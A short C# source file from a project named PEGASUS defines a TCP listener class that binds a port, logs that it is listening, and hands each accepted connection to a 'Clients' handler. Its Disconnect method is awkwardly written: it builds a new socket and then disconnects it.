using System;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using PEGASUS.BytesInOut;

namespace PEGASUS.Diadyktio
{
    internal class Listener
    {
        private Socket Server { get; set; }

        public void Connect(object port)
        {
            try
            {
                var ipEndPoint = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
                Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    SendBufferSize = 50 * 1024,
                    ReceiveBufferSize = 50 * 1024
                };
                Server.Bind(ipEndPoint);
                Server.Listen(500);
                new HandleLogs().Addmsg($"Listenning to: {port}", Color.FromArgb(3, 130, 200));
                Server.BeginAccept(EndAccept, null);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        public void Disconnect(object port)
        {
            var ipEndPoint = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
            Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            {
                SendBufferSize = 50 * 1024,
                ReceiveBufferSize = 50 * 1024
            };

            Server.BeginDisconnect(true, EndAccept, null);
            Server.Disconnect(true);
            Server.Dispose();
            Server.Close();
        }

        private void EndAccept(IAsyncResult ar)
        {
            try
            {
                new Clients(Server.EndAccept(ar));
            }
            catch
            {
            }
            finally
            {
                Server.BeginAccept(EndAccept, null);
            }
        }
    }
}